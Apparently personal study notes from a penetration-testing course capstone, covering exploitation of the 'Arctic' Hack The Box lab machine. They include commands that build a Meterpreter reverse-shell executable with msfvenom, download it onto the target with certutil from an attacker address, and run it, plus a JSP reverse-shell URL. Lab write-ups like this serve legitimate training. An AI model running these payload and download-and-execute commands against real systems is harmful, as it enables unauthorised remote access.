Found possible exploitation [[PNPT/WPE/Capstones/Arctic - HTB/Enumeration|Enumeration]]

# Exploitation
---
- Make changes in exploit script:
	- ![[Pasted image 20250419154349.png]]
- Run the exploit:
	- `python3 exploit.py`
- ![[Pasted image 20250419154537.png]]

# Upgrading the shell
---
- In the script, they are removing the shell, let's remove that command so we can execute the shell ourselves:
	- ![[Pasted image 20250419154905.png]]
- It prints the information while running:
	- ![[Pasted image 20250419154922.png]]
- Executes payload using:
	- ![[Pasted image 20250419154952.png]]
	- `http://10.10.10.11:8500/userfiles/file/a5e2082298044320a3c211c77bedf633.jsp`
- It uses `java/jsp_shell_reverse_tcp`payload
	- ![[Pasted image 20250419155149.png]]
- Let's put all the information in msfconsole and open the url ourselves:
	- ![[Pasted image 20250419155312.png]]
- Get meterpreter shell using :
	- `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.22 lport=443 -f exe -o rev.exe`
	- `certutil.exe -urlcache -f http://10.10.14.22/rev.exe rev.exe`
	- Set options in metasploit and `run -j`
	- Run this executable in previous shell `.\rev.exe`
	- ![[Pasted image 20250419160905.png]]
